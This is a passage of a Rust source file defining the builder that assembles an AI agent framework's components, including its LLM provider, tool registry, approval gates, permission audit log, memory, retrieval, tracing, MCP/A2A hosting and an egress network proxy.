//! AppBuilder — assembly point for all OneAI modules.
//!
//! The AppBuilder is the entry point for constructing a OneAI application.
//! It collects all the components (provider, tools, memory, RAG, approval gate,
//! parser) and wires them together into an App.
//!
//! The LLM provider is optional for the AppBuilder — it's only required
//! when actually running agent inference. For tool-only or workflow-only
//! usage, a provider is not needed.

use std::sync::Arc;

use oneai_core::circuit_breaker::{CircuitBreaker, CircuitBreakerConfig, ThresholdCircuitBreaker};
use oneai_core::error::Result;
use oneai_core::platform::{Platform, PlatformAdapter};
use oneai_core::rate_limiter::{RateLimitConfig, RateLimiter, TokenWindowRateLimiter};
use oneai_core::traits::{
    EmbeddingService, InteractionGate, LlmProvider, MemoryPersistence, OutputParser,
    PermissionResolver, RerankerProvider, RetrievalBackend, Tool, VectorBackend,
};
use oneai_core::usage::{InMemoryUsageTracker, UsageTracker};
use oneai_core::ContextManager;
use oneai_core::ContextManagerConfig;
use oneai_core::EmbeddingConfig;
use oneai_core::ProviderPoolConfig;
use oneai_core::SelectionMode;
use oneai_core::SmartRouteConfig;
use oneai_core::TokenCounter;
use oneai_core::{CloudProviderKind, ModelConfig};
use oneai_core::{Conversation, SessionInfo};

use oneai_provider::{ProviderPool, SmartRouter};

use oneai_memory::{MemoryManager, MemoryManagerConfig};
use oneai_parser::ThreeLayerParser;
use oneai_persistence::FilePersistence;
use oneai_rag::DocumentIndex;
use oneai_rag::EmbeddingConfigExt;
use oneai_skill::SkillSelector;
use oneai_tool::{
    ChannelInteractionGate, InMemoryHostAllowlist, InteractionGateConfig, NetworkPolicy,
    NetworkProxy, NoopInteractionGate, SeededHostAllowlist, ThresholdInteractionGate, ToolExecutor,
    ToolRegistry,
};
use oneai_trace::{InMemoryCollector, TraceContext, TraceEmitter};
use oneai_workflow::WorkflowExecutor;

use oneai_domain::{DomainPack, MergedDomainPack};

use oneai_a2a::A2AClient;

use oneai_wasm::{
    WasmActionTool, WasmModuleManager, WasmModuleRegistry, WasmResourceMonitor, WasmRuntime,
    WasmRuntimeConfig,
};

use oneai_mcp::{McpPluginRegistry, McpServerHost};

use oneai_a2a::{A2AServerHost, AgentCard, TaskStore};

use oneai_persistence::SqliteSessionStore;

use crate::session::AppSession;

// ─── InteractionElicitationReviewer ────────────────────────────────────────────
//
// Routes an MCP server's `elicitation/create` request through the
// `InteractionGate` (as an `InteractionRequest::McpElicitation`). The gate
// surfaces it to the UI handler (Channel/Threshold) or auto-declines
// (Noop). The connection (in `oneai-tool`) calls the `ElicitationReviewer`
// trait this implements — keeping `oneai-tool` free of a dependency on
// `oneai-app` / the gate enum.

/// `ElicitationReviewer` impl that bridges MCP elicitation to the
/// `InteractionGate`. Constructed at `AppBuilder::build()` time from the
/// resolved gate and injected into the `McpPluginRegistry`.
struct InteractionElicitationReviewer {
    gate: Arc<dyn InteractionGate>,
}

impl InteractionElicitationReviewer {
    fn new(gate: Arc<dyn InteractionGate>) -> Self {
        Self { gate }
    }
}

#[async_trait::async_trait]
impl oneai_tool::ElicitationReviewer for InteractionElicitationReviewer {
    async fn review(
        &self,
        server: &str,
        message: &str,
        requested_schema: &serde_json::Value,
    ) -> oneai_core::error::Result<oneai_core::ElicitationOutcome> {
        let req = oneai_core::InteractionRequest::McpElicitation {
            server: server.to_string(),
            message: message.to_string(),
            requested_schema: requested_schema.clone(),
        };
        let resp = self.gate.request(req).await?;
        let outcome = match resp {
            oneai_core::InteractionResponse::ElicitationReply { action, data } => {
                oneai_core::ElicitationOutcome { action, data }
            }
            // Proceed with no data → don't fabricate; decline.
            oneai_core::InteractionResponse::Proceed => oneai_core::ElicitationOutcome {
                action: oneai_core::ElicitationAction::Decline,
                data: None,
            },
            oneai_core::InteractionResponse::Abort { .. } => oneai_core::ElicitationOutcome {
                action: oneai_core::ElicitationAction::Cancel,
                data: None,
            },
            // Revise / Choose / ProceedWith don't map cleanly to an
            // elicitation reply → decline (server should re-prompt if needed).
            _ => oneai_core::ElicitationOutcome {
                action: oneai_core::ElicitationAction::Decline,
                data: None,
            },
        };
        Ok(outcome)
    }
}

/// Builder for assembling a OneAI application.
pub struct AppBuilder {
    /// LLM provider (optional — needed for agent inference).
    provider: Option<Arc<dyn LlmProvider>>,
    /// Tool registry.
    tool_registry: Arc<ToolRegistry>,
    /// Unified interaction gate — every loop-suspend decision point.
    /// When `None` at `build()` time, defaults to `NoopInteractionGate` (zero latency).
    interaction_gate: Option<Arc<dyn InteractionGate>>,
    /// Permission-decision audit log (gap-analysis P1 #9). When set, it is
    /// wired into the ToolExecutor, the code-interpreter bridge, and every
    /// AgentLoop the app spawns — one structured trail for every terminal
    /// tool-permission decision.
    permission_audit_log: Option<Arc<dyn oneai_core::audit::PermissionAuditLog>>,
    /// Engine bus — when set (via [`AppBuilder::engine_bus`]), the app's
    /// interaction gate becomes a `BusInteractionGate` over this bus and
    /// `AppSession::run_turn_via_bus` is available (emits `EngineYield`s).
    engine_bus: Option<Arc<oneai_bus::InProcessBus>>,
    /// Output parser.
    parser: Option<Arc<dyn OutputParser>>,
    /// Memory manager.
    memory_manager: Option<Arc<MemoryManager>>,
    /// Core-memory token budget (always-in-context tier). Overrides the default
    /// (256) when the builder constructs the memory manager.
    core_memory_budget_tokens: Option<usize>,
    /// RAG document index.
    rag_index: Option<Arc<DocumentIndex>>,
    /// Skill selector.
    skill_selector: Option<Arc<SkillSelector>>,
    /// Skill registry — shared with the AgentLoop (for the skill menu / Tier1
    /// progressive disclosure) and with the `skill` tool (Tier2/Tier3 on-demand
    /// loading). Lives on `App` so the session-built AgentLoop can read it.
    skill_registry: Arc<oneai_skill::SkillRegistry>,
    /// Persistence.
    persistence: Option<Arc<FilePersistence>>,
    /// Platform (detected or overridden).
    platform: Option<Platform>,
    /// Trace context (optional — for trajectory logging).
    trace_context: Option<TraceContext>,
    /// OTEL metrics provider (optional — only when `otel` feature on).
    /// Wired into the AgentLoop to record real counters/histograms.
    #[cfg(feature = "otel")]
    metrics_provider: Option<Arc<oneai_trace::OtelMetricsProvider>>,
    /// Domain packs (optional — for domain-specific configuration).
    domain_packs: Vec<DomainPack>,
    /// Owning user id (optional — namespaces cross-session habits/preferences
    /// in the memory tiers, enabling "越用越好用").
    user_id: Option<String>,
    /// A2A client (optional — for inter-agent communication).
    a2a_client: Option<Arc<A2AClient>>,
    /// WASM runtime (optional — for WASM sandbox execution).
    wasm_runtime: Option<Arc<WasmRuntime>>,
    /// WASM module registry (optional — for named module lifecycle management).
    wasm_module_registry: Option<WasmModuleRegistry>,
    /// WASM resource monitor (optional — for execution metrics tracking).
    wasm_resource_monitor: Option<Arc<WasmResourceMonitor>>,
    /// MCP plugin registry (optional — for MCP server management).
    mcp_plugin_registry: Option<McpPluginRegistry>,
    /// Whether to enable MCP server hosting.
    mcp_server_host_enabled: bool,
    /// Custom data-layer reloader (evolution-plan §3.4). When `None` (the
    /// default), `build()` constructs the standard `AppDataLayerReloader`
    /// (skills + MCP re-registration) and registers the `reload` tool. Set
    /// this to plug a custom reloader (or `NoReloader`-style no-op to
    /// suppress the `reload` tool entirely).
    data_layer_reloader: Option<Arc<dyn oneai_core::traits::DataLayerReloader>>,
    /// Whether to enable A2A server hosting.
    a2a_server_host_enabled: bool,
    /// Custom port for A2A server (default: 8080).
    a2a_server_port: Option<u16>,
    /// Custom AgentCard for A2A server (overrides DomainPack auto-generation).
    a2a_server_agent_card: Option<AgentCard>,
    /// SQLite session store (for memory + conversation persistence).
    sqlite_store: Option<Arc<SqliteSessionStore>>,
    /// Embedding service (optional — enables auto-embedding for RAG and memory search).
    embedding_service: Option<Arc<dyn EmbeddingService>>,
    /// Embedding config (optional — for lazy embedding service creation).
    embedding_config: Option<EmbeddingConfig>,
    /// Whether to wire the framework's default in-memory retrieval stack
    /// (`oneai_vector::StandardRetrievalPipeline`: BM25 + dense → RRF) into the
    /// memory `MemoryFactStore` (real-ANN semantic recall) and an
    /// `AutoEmbeddingDocumentIndex` RAG index (real BM25 hybrid retrieval).
    /// Set by [`default_retrieval_stack`](AppBuilder::default_retrieval_stack).
    enable_default_retrieval_stack: bool,
    /// An app-supplied retrieval backend (e.g. Qdrant). When set, overrides
    /// the default in-memory stack for RAG (memory still uses InMemoryVectorBackend).
    retrieval_backend: Option<Arc<dyn RetrievalBackend>>,
    /// Optional reranker for the default retrieval stack (e.g. BgeRerankerOnnx).
    reranker: Option<Arc<dyn RerankerProvider>>,
    /// Usage tracker (optional — enables token-usage tracking for LLM inference calls).
    usage_tracker: Option<Arc<dyn UsageTracker>>,
    /// Rate limiter (optional — prevents exceeding provider API rate limits).
    rate_limiter: Option<Arc<dyn RateLimiter>>,
    /// Circuit breaker (optional — enables provider failover on repeated failures).
    circuit_breaker: Option<Arc<dyn CircuitBreaker>>,
    /// Rate limit config (optional — for auto-creating rate limiter).
    rate_limit_config: Option<RateLimitConfig>,
    /// Circuit breaker config (optional — for auto-creating circuit breaker).
    circuit_breaker_config: Option<CircuitBreakerConfig>,
    /// Provider pool (optional — enables multi-provider fallback).
    provider_pool: Option<Arc<ProviderPool>>,
    /// Provider pool config (optional — for auto-creating provider pool).
    provider_pool_config: Option<ProviderPoolConfig>,
    /// Smart router (optional — enables intelligent model selection based on latency/quality).
    smart_router: Option<Arc<SmartRouter>>,
    /// Smart route config (optional — for auto-creating smart router).
    smart_route_config: Option<SmartRouteConfig>,
    /// Token counter (optional — enables accurate token counting for context management).
    token_counter: Option<Arc<dyn TokenCounter>>,
    /// Context manager (optional — enables model-aware context trimming).
    context_manager: Option<Arc<ContextManager>>,
    /// Context manager config (optional — for auto-creating context manager).
    context_manager_config: Option<ContextManagerConfig>,
    /// Model context resolver (optional — 3-layer context-window resolution:
    /// user config > provider probe > built-in library). When set, attached to
    /// the token counter and context manager as the source of truth for window sizes.
    model_context_resolver: Option<Arc<oneai_core::ModelContextResolver>>,
    /// Whether to probe the provider for context windows at warm-up (default true).
    /// Only effective when a provider is configured and `model_context_resolver`
    /// is enabled (auto-created when any token/context component is configured).
    probe_context_windows: bool,
    /// Sampling / generation parameters (temperature, top_p, max_tokens,
    /// thinking_budget, stop_sequences). Propagated into the `AgentLoopConfig`
    /// that drives every inference call. Each `Some` field overrides the
    /// agent-loop's scenario default; `None` fields inherit it.
    generation_config: oneai_core::GenerationConfig,
    /// Persisted, user-configurable thinking-effort selection (the web UI
    /// "思考程度" toggle). When set, `AppSession` reads it each turn (via
    /// [`oneai_core::ThinkingEffortStore::get`]) and overrides
    /// `generation_config.thinking_budget` for the MAIN agent, and threads it
    /// into the `DefaultSubAgentFactory` so delegated sub-agents cap their
    /// thinking at `min(user_effort, kind_engine_cap)`. `None` (legacy / no
    /// store) → the engine falls back to the generation_config / sub-agent
    /// defaults. The same `Arc<dyn ThinkingEffortStore>` is shared with the
    /// app-server's `thinking/get`·`thinking/set` RPC for live hot-swap.
    thinking_effort: Option<Arc<dyn oneai_core::ThinkingEffortStore>>,
    /// Policy for Layer-1 constrained decoding (tier-gated). Propagated into
    /// the `AgentLoopConfig`. Only takes effect when `structured_output` is
    /// also configured on the loop. Default `Auto`.
    constrained_output_policy: oneai_core::ConstrainedOutputPolicy,
    /// Cadence for the background `Reflect` sub-agent (Phase 2.1 Stage A).
    /// `None` (default) = reflect never fires. `Some(n)` = fire a reflect
    /// sub-agent every `n` iterations + once on `DirectAnswer` delivery
    /// (when not interrupted). Propagated into every `AgentLoopConfig`.
    reflection_cadence: Option<usize>,
    /// Durable working-state store root (optional). When set, the app builds a
    /// `FileWorkingStateStore` rooted here so the agent persists goal/steps/
    /// decisions/blockers to per-task append-only event logs — enabling crash
    /// recovery and cross-session task continuation.
    working_state_root: Option<std::path::PathBuf>,
    /// Explicit session-event store override (issue #40 trajectory replay).
    /// When `None` and `working_state_root` is set, build() derives a
    /// `FileSessionEventStore` from the same root (`<root>/events/*.jsonl`).
    session_event_store: Option<Arc<dyn oneai_core::traits::SessionEventStore>>,
    /// Optional durable cron scheduler (Phase 3.2). Held on `App` so future
    /// agent tools can query schedules; the CLI drives the lifecycle
    /// (`cron serve` / `supervisor serve --with-cron`). The trait seam lives
    /// in `oneai_core` (`CronScheduler`); concrete impls in `oneai_scheduler`.
    cron_scheduler: Option<Arc<dyn oneai_core::traits::CronScheduler>>,

    /// Optional terminal backend (Phase 3.3). Held on `App` so the CLI
    /// (`oneai terminal ...`) and future agent seams can drive it. The trait
    /// seam lives in `oneai_tool` (`TerminalBackend`); concrete impls:
    /// `LocalBackend` (default, current behavior), `DockerTerminalBackend`,
    /// and feature-gated `ModalBackend` / `DaytonaBackend`. The `ShellTool`
    /// owns its own backend (constructed via the DomainPack or `with_backend`);
    /// this field is the app-level handle for out-of-band lifecycle
    /// (snapshot / restore / cleanup).
    terminal_backend: Option<Arc<dyn oneai_tool::TerminalBackend>>,

    /// Working directory the `code_interpreter` tool runs scripts in (the
    /// sandbox's project root for relative file ops). Defaults to the process
    /// CWD at `build()` time. `None` → current_dir().
    code_working_dir: Option<std::path::PathBuf>,

    /// Whether the code-mode egress proxy (#28 Stage 1) is bound at `build()`.
    /// Default `true` on desktop; mobile/native targets set this `false` so
    /// `code_interpreter` air-gaps (`NetworkPolicy::Denied`) instead of binding
    /// a loopback proxy.
    network_proxy_enabled: bool,

    /// How the egress proxy handles a CONNECT to an unknown host (#28 Stage 6).
    /// Default [`NetworkApprovalMode::Prompt`] — block on the interaction gate
    /// (the original v1 behavior). `Defer` = tunnel-now + record-later
    /// ("先执行,后审批"); `Deny` = auto-deny unknown hosts.
    network_approval_mode: oneai_tool::NetworkApprovalMode,

    /// Guardian `AskForApproval` policy (#28 Stage 2). The DomainPack's
    /// `PermissionProfile.approval_policy` overrides this at `build()` when a
    /// domain is configured; this field is the domain-less default.
    guardian_policy: oneai_core::ApprovalPolicy,

    /// Trusted directories for `OnUntrustedDir` (#28 Stage 2). `None` → trust
    /// the working dir only (the `code_interpreter` working dir / process CWD).
    trusted_dirs: Option<Vec<std::path::PathBuf>>,

    /// #28 Stage 5 — where user-approved amendments are persisted (JSONL,
    /// one `ExecRule` per line). `None` → `~/.oneai/rules/default.rules`.
    exec_rules_path: Option<std::path::PathBuf>,

    /// #28 Stage 5 — whether the runtime amendment layer is on (default `true`:
    /// approving a shell command records a full-argv Allow rule so future
    /// identical commands skip the prompt). `false` → the Stage-4 static
    /// posture (no recording, no persistence).
    exec_amendment_enabled: bool,
}

impl AppBuilder {
    /// Create a new builder.
    pub fn new() -> Self {
        Self {
            provider: None,
            tool_registry: Arc::new(ToolRegistry::new()),
            interaction_gate: None,
            permission_audit_log: None,
            engine_bus: None,
            parser: None,
            memory_manager: None,
            core_memory_budget_tokens: None,
            rag_index: None,
            skill_selector: None,
            skill_registry: Arc::new(oneai_skill::SkillRegistry::new()),
            persistence: None,
            platform: None,
            trace_context: None,
            #[cfg(feature = "otel")]
            metrics_provider: None,
            domain_packs: Vec::new(),
            user_id: None,
            a2a_client: None,
            wasm_runtime: None,
            wasm_module_registry: None,
            wasm_resource_monitor: None,
            mcp_plugin_registry: None,
            mcp_server_host_enabled: false,
            data_layer_reloader: None,
            a2a_server_host_enabled: false,
            a2a_server_port: None,
            a2a_server_agent_card: None,
            sqlite_store: None,
            embedding_service: None,
            embedding_config: None,
            enable_default_retrieval_stack: false,
            retrieval_backend: None,
            reranker: None,
            usage_tracker: None,
            rate_limiter: None,
            circuit_breaker: None,
            rate_limit_config: None,
            circuit_breaker_config: None,
            provider_pool: None,
            provider_pool_config: None,
            smart_router: None,
            smart_route_config: None,
            token_counter: None,
            context_manager: None,
            context_manager_config: None,
            model_context_resolver: None,
            probe_context_windows: true,
            generation_config: oneai_core::GenerationConfig::new(),
            thinking_effort: None,
            constrained_output_policy: oneai_core::ConstrainedOutputPolicy::Auto,
            reflection_cadence: None,
            working_state_root: None,
            session_event_store: None,
            cron_scheduler: None,
            terminal_backend: None,
            code_working_dir: None,
            network_proxy_enabled: true,
            network_approval_mode: oneai_tool::NetworkApprovalMode::default(),
            guardian_policy: oneai_core::ApprovalPolicy::default(),
            trusted_dirs: None,
            exec_rules_path: None,
            exec_amendment_enabled: true,
        }
    }

    /// Set the LLM provider.
    pub fn provider(mut self, provider: Arc<dyn LlmProvider>) -> Self {
        self.provider = Some(provider);
        self
    }

    /// Set the full sampling / generation configuration in one call.
    ///
    /// Replaces any previously-set individual parameter. Each `Some` field
    /// overrides the agent-loop's scenario default at inference time; `None`
    /// fields inherit it (e.g. temperature defaults to 0.3 for the agentic
    /// loop, thinking defaults to off).
    ///
    /// ```ignore
    /// AppBuilder::new()
    ///     .generation_config(GenerationConfig::new()
    ///         .temperature(0.2)
    ///         .max_tokens(8192)
    ///         .thinking_budget(Some(20000)))
    /// ```
    pub fn generation_config(mut self, config: oneai_core::GenerationConfig) -> Self {
        self.generation_config = config;
        self
    }

    /// Set the sampling temperature (0.0 = deterministic, 1.0 = creative).
    /// When unset, the agentic loop defaults to 0.3.
    pub fn temperature(mut self, temperature: f32) -> Self {
        self.generation_config.temperature = Some(temperature);
        self
    }

    /// Set the top-p (nucleus) sampling mass. When unset, the provider's own
    /// default (1.0 = no nucleus filtering) is used.
    pub fn top_p(mut self, top_p: f32) -> Self {
        self.generation_config.top_p = Some(top_p);
        self
    }

    /// Set the maximum output tokens. When unset, the provider applies its
    /// model-aware default (safer than a fixed agent-side cap that may exceed
    /// a model's ceiling and error).
    pub fn max_tokens(mut self, max_tokens: u32) -> Self {
        self.generation_config.max_tokens = Some(max_tokens);
        self
    }

    /// Set the extended-thinking token budget. `None` disables thinking (the
    /// default); `Some(n)` enables it with an n-token budget. Thinking is
    /// Anthropic-specific (mapped to `thinking.budget_tokens` and inflates
    /// `max_tokens`); other providers ignore it.
    pub fn thinking_budget(mut self, budget: Option<u32>) -> Self {
        self.generation_config.thinking_budget = budget;
        self
    }

    /// Wire a persisted, user-configurable thinking-effort store (the web UI
    /// "思考程度" toggle). The same `Arc<dyn ThinkingEffortStore>` should be
    /// passed to the app-server's `serve_all` so `thinking/set` hot-swaps the
    /// value the engine reads each turn. See [`App::thinking_effort`].
    pub fn thinking_effort_store(
        mut self,
        store: Arc<dyn oneai_core::ThinkingEffortStore>,
    ) -> Self {
        self.thinking_effort = Some(store);
        self
    }

    /// Set stop sequences — generation halts when any is emitted.
    pub fn stop_sequences(mut self, stop_sequences: Vec<String>) -> Self {
        self.generation_config.stop_sequences = stop_sequences;
        self
    }

    /// Set the Layer-1 constrained-decoding policy.
    ///
    /// Tier-gated: `Auto` (default) enables constrained decoding only for
    /// local/small-model backends (where `LlmProvider::prefers_constrained_output`
    /// returns true); `Always`/`Never` force it on/off. Only takes effect when
    /// `structured_output` is configured on the agent loop. Post-hoc schema
    /// validation + ModelRetry run regardless of this policy.
    pub fn constrained_output_policy(
        mut self,
        policy: oneai_core::ConstrainedOutputPolicy,
    ) -> Self {
        self.constrained_output_policy = policy;
        self
    }

    /// Set the cadence for the background `Reflect` sub-agent (Phase 2.1
    /// Stage A). `Some(n)` fires a reflect sub-agent every `n` iterations
    /// (mid-run) and once on `DirectAnswer` delivery, when not interrupted —
    /// it distills durable learnings to memory. `None` (default) keeps
    /// reflect off (backward-compat). The reflect sub-agent inherits the
    /// parent provider and uses a memory-only tool whitelist.
    pub fn reflection_cadence(mut self, cadence: usize) -> Self {
        self.reflection_cadence = Some(cadence);
        self
    }

    // ─── InteractionGate (unified) ──────────────────────────────────────────

    /// Set the unified interaction gate directly.
    pub fn interaction_gate(mut self, gate: Arc<dyn InteractionGate>) -> Self {
        self.interaction_gate = Some(gate);
        self
    }

    /// Set the permission-decision audit log (gap-analysis P1 #9). Every
    /// terminal tool-permission decision (policy deny/auto-approve, Guardian
    /// verdict, gate approve/abort/revise, direct execution) across the
    /// ToolExecutor path, the code-interpreter bridge, and every AgentLoop
    /// (incl. sub-agents, which inherit it) is then recorded as a
    /// structured [`oneai_core::audit::PermissionAuditEvent`].
    pub fn permission_audit_log(
        mut self,
        log: Arc<dyn oneai_core::audit::PermissionAuditLog>,
    ) -> Self {
        self.permission_audit_log = Some(log);
        self
    }

    /// Use the no-op interaction gate (every point disabled, zero latency).
    /// This is the default when no gate is configured.
    pub fn noop_interaction_gate(mut self) -> Self {
        self.interaction_gate = Some(Arc::new(NoopInteractionGate));
        self
    }

    /// Enable the unified engine bus — constructs an `InProcessBus`, sets the
    /// app's interaction gate to a `BusInteractionGate` over it (so every
    /// approval decision point surfaces as an `EngineYield::ApprovalRequest`
    /// and resolves via `Directive::Approve`), and exposes the bus to
    /// `AppSession::run_turn_via_bus` for yield emission.
    ///
    /// Returns the builder plus the directive `Receiver` the engine driver /
    /// directive-pump task reads `Directive::UserMessage` / `SwitchParadigm` /
    /// `Shutdown` off (the bus handles `Approve`/`Interrupt` itself).
    pub fn engine_bus(mut self) -> (Self, tokio::sync::mpsc::Receiver<oneai_bus::Directive>) {
        let (bus, directive_rx) = oneai_bus::InProcessBus::new();
        let bus = Arc::new(bus);
        let gate = oneai_agent::BusInteractionGate::new(bus.clone());
        self.interaction_gate = Some(Arc::new(gate));
        self.engine_bus = Some(bus);
        (self, directive_rx)
    }

    /// Use a channel-based interaction gate with all points enabled.
    ///
    /// Returns the builder plus the receiver the UI thread drains for pending
    /// interaction requests.
    pub fn channel_interaction_gate(
        mut self,
        buffer_size: usize,
    ) -> (
        Self,
        tokio::sync::mpsc::Receiver<oneai_tool::InteractionPendingItem>,
    ) {
        let (gate, receiver) = ChannelInteractionGate::new(buffer_size);
        self.interaction_gate = Some(Arc::new(gate));
        (self, receiver)
    }

    /// Use a channel-based interaction gate with a per-point config.
    pub fn channel_interaction_gate_with_config(
        mut self,
        buffer_size: usize,
        config: InteractionGateConfig,
    ) -> (
        Self,
        tokio::sync::mpsc::Receiver<oneai_tool::InteractionPendingItem>,
    ) {
        let (gate, receiver) = ChannelInteractionGate::with_config(buffer_size, config);
        self.interaction_gate = Some(Arc::new(gate));
        (self, receiver)
    }

    /// Use a threshold interaction gate: low-risk tools auto-proceed, the rest
    /// (and all other enabled decision points) go through the channel.
    pub fn threshold_interaction_gate(
        mut self,
        buffer_size: usize,
        threshold: oneai_core::RiskLevel,
    ) -> (
        Self,
        tokio::sync::mpsc::Receiver<oneai_tool::InteractionPendingItem>,
    ) {
        let (gate, receiver) =
            ThresholdInteractionGate::new(buffer_size, threshold, InteractionGateConfig::default());
        self.interaction_gate = Some(Arc::new(gate));
        (self, receiver)
    }

    /// Threshold interaction gate with a per-point config — the TUI uses this
    /// with `InteractionGateConfig::tui_default()` (PreInfer/PostInfer off) plus
    /// a Medium risk threshold so standard tools auto-proceed.
    pub fn threshold_interaction_gate_with_config(
        mut self,
        buffer_size: usize,
        threshold: oneai_core::RiskLevel,
        config: InteractionGateConfig,
    ) -> (
        Self,
        tokio::sync::mpsc::Receiver<oneai_tool::InteractionPendingItem>,
    ) {
        let (gate, receiver) = ThresholdInteractionGate::new(buffer_size, threshold, config);
        self.interaction_gate = Some(Arc::new(gate));
        (self, receiver)
    }

    /// Use a PlatformAdapter's interaction gate.
    ///
    /// Convenience method that unpacks the platform adapter's interaction gate
    /// and sets it as the app's interaction gate. Also records the platform type.
    pub fn platform_adapter(mut self, adapter: PlatformAdapter) -> Self {
        self.interaction_gate = Some(adapter.interaction_gate);
        self.platform = Some(adapter.platform);
        self
    }

    /// Set the output parser.
    pub fn parser(mut self, parser: Arc<dyn OutputParser>) -> Self {
        self.parser = Some(parser);
        self
    }

    /// Use the default 3-layer parser.
    pub fn default_parser(mut self) -> Self {
        self.parser = Some(Arc::new(ThreeLayerParser::new()));
        self
    }

    /// Set the memory manager.
    pub fn memory_manager(mut self, manager: Arc<MemoryManager>) -> Self {
        self.memory_manager = Some(manager);
        self
    }

    /// Set the token budget for the always-in-context core-memory block.
    ///
    /// The core block holds the agent's curated identity/preference facts and
    /// is re-sent every turn (it lives in the volatile tail), so keeping it
    /// small directly cuts per-turn cache-miss tokens. Overflow beyond this
    /// budget is evicted (lowest-importance first) to the archival tier and
    /// recalled on demand via `memory_search`. Defaults to 256 tokens.
    pub fn core_memory_budget(mut self, tokens: usize) -> Self {
        self.core_memory_budget_tokens = Some(tokens);
        self
    }

    /// The memory-manager config, with any builder-overridden core-memory
    /// budget applied over the defaults. Takes the `Copy` budget field rather
    /// than `&self` so it stays callable after `self` is partially moved.
    fn memory_manager_config(budget: Option<usize>) -> MemoryManagerConfig {
        let mut config = MemoryManagerConfig::default();
        if let Some(b) = budget {
            config.core_memory_budget_tokens = b;
        }
        config
    }

    /// Set the RAG document index.
    pub fn rag_index(mut self, index: Arc<DocumentIndex>) -> Self {
        self.rag_index = Some(index);
        self
    }

    /// Set the skill selector.
    pub fn skill_selector(mut self, selector: Arc<SkillSelector>) -> Self {
        self.skill_selector = Some(selector);
        self
    }

    /// Set the shared skill registry. The same `Arc` is handed to the AgentLoop
    /// (for the always-on skill menu) and to the `skill` tool (for on-demand
    /// loading of a skill's full prompt).
    pub fn skill_registry(mut self, registry: Arc<oneai_skill::SkillRegistry>) -> Self {
        self.skill_registry = registry;
        self
    }

    /// Set the persistence layer.
    pub fn persistence(mut self, persistence: Arc<FilePersistence>) -> Self {
        self.persistence = Some(persistence);
        self
    }

    /// Enable in-memory tracing (stores all spans for later JSON export).
    pub fn trace_in_memory(mut self) -> Self {
        let ctx = TraceEmitter::global()
            .create_context_with_collector(Arc::new(InMemoryCollector::new()));
        self.trace_context = Some(ctx);
        self
    }

    /// Enable file-based tracing (writes JSON to the specified path).
    pub fn trace_to_file(mut self, path: &str) -> Self {
        let ctx = TraceEmitter::global()
            .create_context_with_collector(Arc::new(oneai_trace::FileCollector::new(path)));
        self.trace_context = Some(ctx);
        self
    }

    /// Enable tracing with a custom collector.
    pub fn trace_collector(mut self, collector: Arc<dyn oneai_trace::TraceCollector>) -> Self {
        let ctx = TraceEmitter::global().create_context_with_collector(collector);
        self.trace_context = Some(ctx);
        self
    }

    /// Disable tracing (no events will be collected).
    pub fn trace_disabled(mut self) -> Self {
        self.trace_context = Some(TraceContext::disabled());
        self
    }

    /// Enable OTEL tracing — exports spans to an OTEL backend via OTLP/HTTP.
    ///
    /// Creates an `OtlpCollector` backed by a real [`HttpOtlpExporter`] that
    /// POSTs OTLP/JSON spans to `{endpoint}/v1/traces` (a standard OTEL
    /// collector accepts these on port 4318). This used to construct a gRPC
    /// config — which only ever warned and never delivered spans; the default
    /// protocol is now OTLP/HTTP so spans actually reach the collector.
    ///
    /// Requires the `otel` feature on `oneai-trace` (forwarded by this
    /// crate's `otel` feature).
    ///
    /// **Usage**:
    /// ```ignore
    /// let app = AppBuilder::new()
    ///     .provider(provider)
    ///     .trace_otel("http://localhost:4318")
    ///     .build()?;
    /// ```
    #[cfg(feature = "otel")]
    pub fn trace_otel(mut self, endpoint: &str) -> Self {
        // OTLP/HTTP — the protocol that actually exports. The endpoint should
        // point at the collector's HTTP port (default 4318).
        let config = oneai_trace::OtlpConfig::http(endpoint, "oneai-agent");
        let collector = oneai_trace::OtlpCollector::new(config);
        let ctx = TraceEmitter::global().create_context_with_collector(Arc::new(collector));
        self.trace_context = Some(ctx);
        self
    }

    /// Enable OTEL tracing with explicit HTTP protocol (alias of `trace_otel`
    /// now that the default is already HTTP — kept for API stability).
    #[cfg(feature = "otel")]
    pub fn trace_otel_http(mut self, endpoint: &str) -> Self {
        let config = oneai_trace::OtlpConfig::http(endpoint, "oneai-agent");
        let collector = oneai_trace::OtlpCollector::new(config);
        let ctx = TraceEmitter::global().create_context_with_collector(Arc::new(collector));
        self.trace_context = Some(ctx);
        self
    }

    /// Enable OTEL tracing with custom configuration.
    #[cfg(feature = "otel")]
    pub fn trace_otel_config(mut self, config: oneai_trace::OtlpConfig) -> Self {
        let collector = oneai_trace::OtlpCollector::new(config);
        let ctx = TraceEmitter::global().create_context_with_collector(Arc::new(collector));
        self.trace_context = Some(ctx);
        self
    }

    /// Wire an [`OtelMetricsProvider`] into the agent loop — the loop records
    /// real OTEL counters/histograms at inference + tool-call + error hot
    /// paths (gap-analysis #4: the provider existed but was never instantiated).
    ///
    /// Combine with `trace_otel(...)` for full OTEL observability (spans +
    /// metrics). Without this call, metrics stay opt-in None (zero overhead).
    ///
    /// **Usage**:
    /// ```ignore
    /// let app = AppBuilder::new()
    ///     .provider(provider)
    ///     .trace_otel("http://localhost:4318")
    ///     .otel_metrics(Arc::new(OtelMetricsProvider::new()))
    ///     .build()?;
    /// ```
    #[cfg(feature = "otel")]
    pub fn otel_metrics(mut self, provider: Arc<oneai_trace::OtelMetricsProvider>) -> Self {
        self.metrics_provider = Some(provider);
        self
    }

    /// Enable memory reflection — the STM↔LTM closed loop.
    ///
    /// When enabled, the memory manager will:
    /// 1. Proactively recall relevant facts into context each turn (recall_facts)
    /// 2. At session end, reflect on the conversation and generate an episodic fact
    ///
    /// This requires an LLM provider for the reflection prompt.
    ///
    /// **Usage**:
    /// ```ignore
    /// let app = AppBuilder::new()
    ///     .provider(provider)
    ///     .with_memory_reflection()  // ← enables session-end reflection
    ///     .build()?;
    /// ```
    pub fn with_memory_reflection(mut self) -> Self {
        if let Some(provider) = &self.provider {
            let config = Self::memory_manager_config(self.core_memory_budget_tokens);
            self.memory_manager = Some(Arc::new(MemoryManager::with_compressor_and_reflection(
                config,
                provider.clone(),
            )));
        }
        // If no provider is set yet, reflection will be enabled when
        // the provider is set (via the build() method).
        self
    }

    /// Add a domain pack for domain-specific configuration.
    ///
    /// A DomainPack provides the 5 layers of domain workflow embedding:
    /// 1. Domain-specific tools and tool description overrides
    /// 2. Domain-specific context sources (environment sensing)
    /// 3. Domain-specific permission profile (approval rules)
    /// 4. Domain-specific paradigm strategies (task → paradigm mapping)
    /// 5. Domain-specific compression template (context preservation)
    ///
    /// Example:
    /// ```ignore
